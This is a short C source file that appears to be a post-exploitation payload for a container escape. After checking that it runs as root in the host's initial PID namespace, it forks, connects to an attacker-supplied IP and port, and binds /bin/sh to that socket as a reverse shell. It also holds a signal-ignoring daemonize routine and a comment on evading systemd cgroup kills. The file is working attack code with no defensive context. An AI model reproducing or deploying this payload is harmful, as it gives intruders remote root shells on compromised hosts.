//
// Created by explorer on 2022/12/9.
//
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <signal.h>

void do_daemonize() {
    pid_t pid = 0;
    int fd;

    setsid();

    signal(SIGCHLD, SIG_IGN);
    pid = fork();

    if (pid > 0) {
        _exit(0);
    }
    umask(0);

    chdir("/");
    // sysconf(_SC_OPEN_MAX)
    for (fd = 255; fd > 0; fd--) {
        close(fd);
    }

    open("/dev/null", O_RDWR, 0);
    dup(0);
    dup(0);

    // ignore all signal
    for (int i = 1; i < 32; i++) {
        signal(i, SIG_IGN);
    }
}


void _start(unsigned int reverse_ip, unsigned short reverse_port) {
    char buffer[0x100];

    if (getuid() != 0) {
        return;
    }

    int re = readlink("/proc/1/ns/pid", buffer, 0x100);
    buffer[re] = 0;
    if (strcmp(buffer, "pid:[4026531836]") != 0) {
        return;
    }

    // return is /tmp/.x exist
    if (open("/tmp/.x", O_CREAT | O_EXCL, S_IRWXU | S_IRWXG | S_IRWXG) < 0) {
        return;
    }

    pid_t pid = fork();
    if(pid) {
        return;
    }


//    do_daemonize();
    // sometimes cgourp and systemd will kill our process
    // but not good to solve that here
    // run "echo $$ > /sys/fs/cgroup/systemd/tasks" as fast as you can

    int fd = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in server = {0};
    server.sin_family = AF_INET;
    server.sin_port = reverse_port;
    server.sin_addr.s_addr = reverse_ip;

    connect(fd, (const struct sockaddr *) &server, sizeof(server));
    dup2(fd, STDIN_FILENO);
    dup2(fd, STDOUT_FILENO);
    dup2(fd, STDERR_FILENO);
    execve("/bin/sh", NULL, NULL);
    _exit(0);
}